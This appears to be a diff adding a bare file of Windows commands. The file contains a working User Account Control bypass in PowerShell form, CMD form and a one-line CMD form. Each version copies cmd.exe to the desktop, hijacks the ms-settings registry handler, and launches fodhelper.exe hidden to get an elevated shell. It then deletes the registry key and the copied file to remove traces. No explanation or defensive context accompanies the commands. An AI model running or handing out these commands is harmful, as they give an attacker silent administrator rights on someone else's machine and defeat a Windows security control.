@@ -1,0 +1,33 @@
+
+POWERSHELL
+-------------------------------------------------------
+copy c:\windows\system32\cmd.exe $env:USERPROFILE\desktop\123.exe;
+
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force;
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force;
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $env:USERPROFILE\desktop\123.exe;
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden;
+
+Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force;
+
+-------------------------------------------------------
+
+
+
+
+CMD
+-------------------------------------------------------
+copy c:\windows\system32\cmd.exe %USERPROFILE%\desktop\123.exe
+
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /f
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "%USERPROFILE%\Desktop\123.exe" /f
+start /b "" "C:\Windows\System32\fodhelper.exe"
+
+reg delete HKCU\Software\Classes\ms-settings /f /va
+del %USERPROFILE%\desktop\123.exe
+-------------------------------------------------------
+
+-------------------------------------------------------
+copy c:\windows\system32\cmd.exe %USERPROFILE%\desktop\123.exe & reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /f & reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f & reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "%USERPROFILE%\Desktop\123.exe" /f & start /b "" "C:\Windows\System32\fodhelper.exe" & reg delete HKCU\Software\Classes\ms-settings /f /va & del %USERPROFILE%\desktop\123.exe
+-------------------------------------------------------
